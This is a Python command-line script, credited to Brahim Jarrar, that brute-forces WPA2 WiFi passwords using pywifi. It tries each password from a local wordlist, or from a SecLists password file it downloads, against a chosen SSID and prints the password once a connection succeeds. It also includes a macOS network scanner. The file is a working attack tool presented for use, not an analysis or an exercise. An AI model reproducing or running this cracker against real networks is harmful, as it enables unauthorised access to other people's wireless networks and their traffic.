#!/usr/bin/env python 3.7
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import os.path
import platform
import re, threading
import time

import requests

try:
    pass
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
except Exception as e:
    print(f"Installing pywifi: {e!r}")
    # TODO: pip install -e git+https://github.com/awkman/pywifi.git@macos_dev#egg=pywifi


# By Brahim Jarrar ~
# GITHUB : https://github.com/BrahimJarrar/ ~
# CopyRight 2019 ~

RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

try:
    # wlan
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan()  # check the card
    results = ifaces.scan_results()

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    # print(111, wifi.interfaces())
except Exception as e:
    print(f"[-] Error system {e!r}")

type = False


def main(ssid, password, number):
    t1 = time.time()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1)  # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile)  # trying to Connect
    time.sleep(0.35)  # 1s

    t2 = time.time() - t1
    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(BOLD, GREEN, '[*] Crack success!',RESET, round(t2, 2))
        print(BOLD, GREEN, '[*] password is ' + password, RESET)
        time.sleep(1)
        raise AssertionError()
    else:
        print(RED, '[{}] Crack Failed using `{}`. ts={}'.format(number, password, round(t2, 2)))


def pwd(ssid, generator):
    t1 = time.time()

    try:
        for pwd, number in generator:
            main(ssid, pwd, number)
    except AssertionError:
        print('Time all:', round(time.time() - t1, 2))


def scan(concrete_ssid=None):
    import objc

    bundle_path = '/System/Library/Frameworks/CoreWLAN.framework'
    objc.loadBundle('CoreWLAN',
                    bundle_path=bundle_path,
                    module_globals=globals())

    iface = CWInterface.interface()
    networks = iface.scanForNetworksWithName_includeHidden_error_(concrete_ssid, True, None)
    return {
        i.ssid(): {
            'RSSI': i.rssiValue(),
            # 'BSSID': i.bssid(),
            # 'all': i
        }
        for i in sorted(networks[0].allObjects(), key=lambda i: abs(i.rssiValue())) if i.ssid() is not None
    }


def read_passwords(file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            yield pwd, number


def download_words(filename: str):
    filename = 'xato-net-10-million-passwords-100.txt'
    if not os.path.exists(filename):
        url = f"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/{filename}"
        response = requests.get(url)
        with open(filename, 'w') as fo:
            fo.write(response.text)
        del response

    number = 0
    with open(filename) as fi:
        for line in fi:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            yield pwd, number


def gen_passwords(data: list):
    for number, pwd in enumerate(data, 1):
        yield pwd, number


def menu():
    parser = argparse.ArgumentParser(description='argparse Example')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...', default='./words.txt')
    parser.add_argument('-a', "--scan", action="store_true", help="Scan all IPs on this networks")
    parser.add_argument('-v', '--version', action="store_true", help='version')
    # group1 = parser.add_mutually_exclusive_group()
    # group1.add_argument('-v', '--version', metavar='', help='version')
    args = parser.parse_args()

    print(CYAN, "[+] You are using: ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2.5)

    filee = ssid = None
    if args.version:
        print("\n\n", CYAN, "by Brahim Jarrar\n")
        print(RED, " github:", BLUE, " https://github.com/BrahimJarrar/\n")
        print(GREEN, " CopyRight 2019\n\n")
        exit()
    elif args.scan:
        print(GREEN, scan(args.ssid or None))
        exit()
    elif args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        filee = input("[*] pwds file: : ")

    print("[*] SSID: ", str(ssid), repr(ssid))
    # thx
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE, "[~] Cracking...")
        pwd(ssid, read_passwords(filee))
    elif filee == 'gen':
        print(BLUE, "[~] Cracking...")
        pwd(ssid, gen_passwords(['20012001', '20052005', '00000000']))
    else:
        next(download_words(filee))
        print(RED,"[-] No Such File.",BLUE)


if __name__ == "__main__":
    menu()
